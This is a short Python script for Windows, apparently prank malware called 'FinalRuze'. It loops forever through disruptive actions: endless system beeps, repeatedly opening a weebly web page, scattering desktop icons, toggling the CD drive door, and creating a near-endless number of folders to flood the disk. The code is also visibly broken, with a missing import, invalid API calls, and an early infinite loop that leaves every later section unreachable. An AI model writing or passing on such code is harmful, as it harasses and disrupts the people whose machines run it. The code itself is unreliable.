import os
import webbrowser
import win32com.client as comclt
import win32api
import win32con
import random
import time

# Beep sound
while True:
    comclt.Dispatch("WScript.Shell").Run('PowerShell -Command "[System.Media.SystemSounds]::Beep.Play()"', 0, True)

# Open website
while True:
    webbrowser.open("https://j26nabr4tcsw908qiu.weebly.com/")
    webbrowser.open("https://j26nabr4tcsw908qiu.weebly.com/")

# Randomly move desktop icons
shell = comclt.Dispatch("WScript.Shell")
shellapp = comclt.Dispatch("Shell.Application")
desktop = shellapp.Namespace(0)
folder = desktop.Self
while True:
    for item in folder.Items():
        if item.IsFolder:
            # get random x and y coordinates
            xPos = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CXSCREEN) - item.Width)
            yPos = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CYSCREEN) - item.Height)
            
            # move the item to the random position
            shellapp.MoveItem(item, xPos, yPos)
    time.sleep(5)

# Eject CD/DVD drive
cdrom = 4
while True:
    for i in range(win32api.GetLogicalDrives()):
        if win32file.GetDriveType(i) == cdrom:
            win32api.mciSendString("set cdaudio door open", None, 0, None)
            win32api.mciSendString("set cdaudio door closed", None, 0, None)

# Create folders
num_folders = 99999999999999
base_folder_name = "FinalRuze"
for i in range(num_folders):
    folder_name = base_folder_name + str(i)
    os.mkdir(folder_name)
    print("Created folder: " + folder_name)

# Display message and wait for user input
print("Press any key to continue...")
input()

# Display message and loop forever
while True:
    print("This is the FinalRuze")
    time.sleep(0.1)
